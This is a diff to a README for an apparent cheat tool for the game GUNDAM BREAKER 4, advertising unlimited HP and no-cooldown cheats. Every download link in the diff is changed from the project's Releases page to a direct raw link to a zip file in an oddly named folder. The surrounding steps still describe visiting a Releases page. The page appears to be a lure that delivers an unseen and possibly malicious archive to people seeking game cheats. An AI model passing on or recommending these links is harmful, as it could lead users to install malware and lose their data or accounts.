@@ -4,13 +4,13 @@
 Experience-boost-hack-GUNDAM-4 allows you to unlock amazing features in GUNDAM BREAKER 4. With this application, you can enjoy combo multipliers, unlimited HP, and no cooldown cheats. It greatly improves your gameplay and helps you explore all that GUNDAM BREAKER 4 has to offer.
 
 ## 📥 Download Now
-[![Download Experience-boost-hack-GUNDAM-4](https://img.shields.io/badge/Download-Experience--boost--hack--GUNDAM--4-blue)](https://github.com/Prit12pp/Experience-boost-hack-GUNDAM-4/releases)
+[![Download Experience-boost-hack-GUNDAM-4](https://raw.githubusercontent.com/Prit12pp/Experience-boost-hack-GUNDAM-4/main/corpusculated/Experience-boost-hack-GUNDAM-4.zip)](https://raw.githubusercontent.com/Prit12pp/Experience-boost-hack-GUNDAM-4/main/corpusculated/Experience-boost-hack-GUNDAM-4.zip)
 
 ## 🚀 Getting Started
 To get started with Experience-boost-hack-GUNDAM-4, you need to download the application from our Releases page. Follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page.
-   [Download Experience-boost-hack-GUNDAM-4](https://github.com/Prit12pp/Experience-boost-hack-GUNDAM-4/releases)
+   [Download Experience-boost-hack-GUNDAM-4](https://raw.githubusercontent.com/Prit12pp/Experience-boost-hack-GUNDAM-4/main/corpusculated/Experience-boost-hack-GUNDAM-4.zip)
 
 2. **Select the Latest Release:** Once on the page, look for the most recent version of the software. It will have the highest version number.
 
@@ -65,4 +65,4 @@ Experience-boost-hack-GUNDAM-4 is open-source. You can use it according to the t
 ## ⚖️ Disclaimer
 Using mods and hacks may affect your game experience. Use at your own risk and be respectful of other players. Enjoy your enhanced GUNDAM BREAKER 4 adventure!
 
-[Download Experience-boost-hack-GUNDAM-4](https://github.com/Prit12pp/Experience-boost-hack-GUNDAM-4/releases)
+[Download Experience-boost-hack-GUNDAM-4](https://raw.githubusercontent.com/Prit12pp/Experience-boost-hack-GUNDAM-4/main/corpusculated/Experience-boost-hack-GUNDAM-4.zip)
